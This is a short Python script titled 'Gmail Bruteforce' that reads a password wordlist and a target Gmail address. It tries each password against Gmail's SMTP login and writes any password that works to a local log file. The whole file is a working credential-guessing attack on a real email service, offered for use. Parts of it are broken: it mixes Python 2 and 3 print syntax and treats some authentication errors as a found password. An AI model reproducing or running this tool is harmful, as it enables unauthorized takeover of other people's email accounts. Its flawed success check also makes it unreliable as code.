import smtplib
from os import system
import sys
import time

global logFile
logFile = 'Password_Log.txt'

global target
global passfile
target = sys.argv[2]
passfile = sys.argv[1]

def hacks():
    system("clear")
    print("---==[ Gmail Bruteforce ]==---")
    pass_file = open(passfile,"r")
    pass_list = pass_file.readlines()

    i = 0
    gmail = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    gmail.ehlo()

    for password in pass_list:
        i = i + 1
        print str(i) + '/' + str(len(pass_list))
        try:
            gmail.login(target, password)
            system("clear")
            print("[-]Target's Password Is: " + password)
            print("[-]Logging Details In .txt File...")
            w = open(logFile, 'w')
            w.write(target+'\n'+password+'\n==================')
            w.close()
            print("[-]Exiting...")
            sys.exit(1)
        except smtplib.SMTPAuthenticationError as s:
            error = str(s)
            if error[14] == '<':
                print("[-]Target's Password Is: " + password)
                print("[-]Logging Details In .txt File...")
                w = open(logFile, 'w')
                w.write(target+'\n'+password+'\n==================')
                w.close()
                print("[-]Exiting...")
                sys.exit()
            else:
                print("[-]Attack Failed :(")

if __name__=='__main__':
    hacks()


